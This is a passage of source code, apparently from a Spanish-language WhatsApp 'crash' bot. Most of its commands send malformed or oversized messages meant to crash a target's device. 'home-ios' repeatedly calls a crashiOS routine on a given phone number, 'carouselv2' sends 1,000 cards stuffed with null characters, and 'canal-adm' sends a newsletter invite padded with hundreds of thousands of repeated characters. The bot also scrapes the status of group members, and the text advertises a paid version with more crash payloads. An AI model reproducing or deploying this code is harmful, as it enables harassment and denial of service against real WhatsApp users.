        const apiUrl = `https://api.dorratz.com/v2/tiktok-dl?url=${encodeURIComponent(q)}`;
        const noze = await fetch(apiUrl);
        if (!noze.ok) throw new Error(`Error API ${noze.status}`);
        const json = await noze.json();
        if (!json.status || !json.data) return reply('No se encontró el video.');
        const { title, duration, repro, like, share, comment, author, music, media } = json.data;
        const caption = `
> *Título:* \`${title}\`
> *Autor:* ${author.nickname} (${author.username})
> *Música:* ${music.title}
> *Duración:* ${duration}s
> *Reproducciones:* ${repro}
> *Likes:* ${like}
> *Comentarios:* ${comment}
> *Compartidos:* ${share}
        `;
const urlx = media.hd || media.org;
await conn.sendMessage(from, { 
    video: { url: urlx }, 
       caption: caption.trim()
        }, { quoted: m });

    } catch (err) {
        console.error(err);
        reply('Error');
    }
}
break;

case "home-ios": {
    if (!isBot && !isCreator) return;

    let pelaku = m.mentionedJid && m.mentionedJid.length > 0
        ? m.mentionedJid[0]
        : m.quoted
            ? m.quoted.sender
            : (q ? q.replace(/[^0-9]/g, '') : null);

    if (!pelaku) return reply(" Ingresa un número válido.");

    let target = pelaku.includes('@s.whatsapp.net') ? pelaku : pelaku + "@s.whatsapp.net";
    if (candList.includes(target)) {
        //kkkkk
        await conn.sendMessage(m.chat, { 
            text: `Nel, con el owner no ` 
        }, { quoted: m });
        await conn.sendMessage("593969533280@s.whatsapp.net", { 
            text: `User *${m.sender}* intentó follar a ${target}.`
        });
        return;
    }
    crashiOS(target)
    await sleep(3000)
    crashiOS(target)
    await sleep(3000)
    crashiOS(target)
    await sleep(3000)
    crashiOS(target)
    await sleep(3000)
    crashiOS(target)
    conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }});
}
break;
case 'catalogo-ios':{
if (!isBot && !isCreator) return
const fs = require('fs');
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/ola.jpg') }, { upload: conn.waUploadToServer })
var catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": "🎠" + cataui,
"description": cataui,
"currencyCode": `BRL`,
"footerText": cataui,
"priceAmount1000": "1000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000000000",
"retailerId": ` `,
"url": "wa.me/9473839229292"
},
"businessOwnerJid": "526421147692@s.whatsapp.net",
}
}), { userJid: from })
conn.relayMessage(from, catalog.message, { messageId: catalog.key.id })
}
break 
case "carouselv2": {
if (!isBot && !isCreator) return
let haxxn = 10;

for (let i = 0; i < haxxn; i++) {
let push = [];
let buttt = [];

for (let i = 0; i < 5; i++) {
buttt.push({
    "name": "galaxy_message",
    "buttonParamsJson": JSON.stringify({
    "header": "null",
    "body": "xxx",
    "flow_action": "navigate",
    "flow_action_payload":{ screen: "FORM_SCREEN" },
    "flow_cta": "Grattler",
    "flow_id": "1169834181134583",
    "flow_message_version":"3",
"    flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
})
},
)}
for (let i = 0; i < 1000; i++) {
push.push({
    "body": {
        "text": `\u0000\u0000\u0000\u0000\u0000`
    },
    "footer": {
        "text": ""
    },
      "header": {
        "title": '⃕͜By : 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘 & 『』\u0000\u0000\u0000\u0000',
        "hasMediaAttachment": true,
  "imageMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
    "mimetype": "image/jpeg",
    "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
    "fileLength": "591",
    "height": 0,
    "width": 0,
    "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
    "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
    "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1721344123",
    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
    "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
    "scanLengths": [
      247,
      201,
      73,
      63
    ],
    "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
  }

      },
      "nativeFlowMessage": {
"buttons": [

]
      }
    });
  }

const carousel = generateWAMessageFromContent(from, {
"viewOnceMessage": {
"message": {
"messageContextInfo": {
    "deviceListMetadata": {},
    "deviceListMetadataVersion": 2
},
"interactiveMessage": {
    "body": {
        "text": '\u0000\u0000\u0000\u0000'
    },
    "footer": {
        "text": "¿Kkkkkk?"
    },
    "header": {
        "hasMediaAttachment": false
    },
    "carouselMessage": {
        "cards": [
        ...push
        ]
    },
}
}
}
}, {});

  await conn.relayMessage(from, carousel.message, {
    messageId: carousel.key.id
  });
}
}
break


case "lin":
if (!isBot && !isCreator) return
    {
      let resultText = "Infos:\n";
      if (m.isGroup) {
        for (const jid of participants) {
          await sleep(1000);
          let res = await conn.fetchStatus(jid.jid);
          let status = res[0]?.status.status || "";
          let setAt = res[0]?.status.setAt || "";
          let id = res[0]?.id || "";
        resultText += `Id: *${id}*\nStatus: *${status}*\nTime: *${setAt}*\n---------------------------\n`;
          await sleep(1000);
        }
        await conn.sendMessage(from, { text: resultText });
      } else {
        let res = await conn.fetchStatus(from);
        console.log(res);
        let status = res[0]?.status.status || "";
        let setAt = res[0]?.status.setAt || "";
        let id = res[0]?.id || "";
        resultText += `Id: *${id}*\nStatus: *${status}*\nTime: *${setAt}*\n---------------------------\n`;
        await conn.sendMessage(from, { text: resultText });
      }
    }
    break;

case 'tag': {
if (!isBot && !isCreator) return;
    if (!m.isGroup) return reply("Este comando solo funciona en grupos")
    
    let metadata = await conn.groupMetadata(m.chat)
    let participantes = metadata.participants.map(u => u.id)

    await conn.sendMessage(m.chat, {
        text: "",
        mentions: participantes
    }, { quoted: m.quoted ? m.quoted : info })
}
break
    case 'menu':
    if (!isBot && !isCreator) return 

    const os = require('os');
    const moment = require('moment-timezone');
    const fs = require('fs');

    var deviceType = m.key.id.length > 21 ? 'Android' : m.key.id.substring(0, 2) == '3A' ? 'IPhone' : 'WhatsApp Web';
    const hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
    const data = moment.tz('America/Sao_Paulo').format('DD/MM/YY');

  const menuzz = fs.readFileSync('./src/thumb.jpg');

    await conn.sendMessage(from, {
        image: { url: './src/foto.jpg' },
        contextInfo: {
            externalAdReply: {
                title: `𝐏.𝑐ℎ𝑜𝑐𝑜𝑐𝑟𝑖𝑠𝑝𝑦`,
                body: '⃟Բᖇᕮᕮ ᗷ〇〇Ƭ⿻⃟',
                mediaType: 4,
                thumbnail: menuzz,
                jpegThumbnail: menuzz,
                mediaUrl: 'https://youtube.com/@p.a.zinwebkkkkj',
                sourceUrl: 'https://whatsapp.com/channel/0029VaorTv7AzNbwdT52Rj2C'
            }
        },
        caption: `
╭⪫═════════════════⪫
│  ⃟Բᖇᕮᕮ ᗷ〇〇Ƭ⃟
│  \`Usuario\`: ${pushname}
│  \`Hora:\` ${hora}
│  \`Fecha:\` ${data}
│  \`Estado:\` Online
│  \`Dispositivo:\` ${deviceType}
│  \`Plataforma:\` ${os.platform()}
│  \`HostName:\` ${os.hostname()}
╰═════════════════╯
  *LISTA DE COMANDOS*
  ANDORID
> crash-home 593xxx
> canal-adm
> carouselv2
> atraso
> atraso-package 593xxx
> crash-chat
> button
  IOS 
> home-ios 593xxxx
> catalogo-ios 593xxx
  OTROS 
> play nombre  
> lin
> tt link
> nuke
> tag`,
        footer: `𝐏 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘`,
        buttons: [
            {
                buttonId: '..',
                buttonText: { displayText: '.' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: "⃟Բᖇᕮᕮ ᗷ〇〇Ƭ⃟",
                        sections: [
                            {
                                title: "INFO",
                                rows: [
                                    {
                                        title: " 《 • INFO • 》",
                                        description: "⃟Բᖇᕮᕮ ᗷ〇〇Ƭ⃟",
                                        id: `info`
                                    }
                                ]
                            }
                        ]
                    })
                }
            },
        ],
        headerType: 1,
        viewOnce: true
    }, { quoted: m });
break;
case 'info':
    await conn.sendMessage(from, {
        text: `
《 • INFO • 》
> By 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘
\`Versión:\` *FREE*
\`INFO:\` *Este es un bot gratuito por eso no cuentara con todas las funciones de paga*\n*Si quieres un bot completo con todas muchas más trabas puedes comprarlo aquí*: 
+52 642 114 7692
        `
    }, { quoted: webozz });
break;

case "canal-adm":
const travas = `${"ꦾ".repeat(90000)}`
if (!isBot && !isCreator && !isNose) return
if (m.isGroup && groupid.includes(m.chat)) {
    return reply("❎❎❎❎");
}
conn.relayMessage(from,{"newsletterAdminInviteMessage":{"newsletterJid":"120363282786345717@newsletter","newsletterName":"🗣🗣🗣🗣" + travas + travas + travas ,"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADMARwMBIgACEQEDEQH/xAAoAAEBAQAAAAAAAAAAAAAAAAAAAQYBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAAM4AAAgqCoAAAAAAAAAKBAAAA//EABQQAQAAAAAAAAAAAAAAAAAAAFD/2gAIAQEAAT8Af//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8AJ//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AJ//Z","caption":"𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁","inviteExpiration":"1717872809"}},{})
conn.relayMessage(from,{extendedTextMessage: {text: `𝐏.𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘  ᶻ 𝗓 𐰁`}},{})
break

default:
}

} catch (err) {
 
  console.log(util.format(err))
  let e = String(err)

if (e.includes("conflict")) return
if (e.includes("Cannot derive from empty media key")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
if (e.includes("Socket connection timeout")) return


}
}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
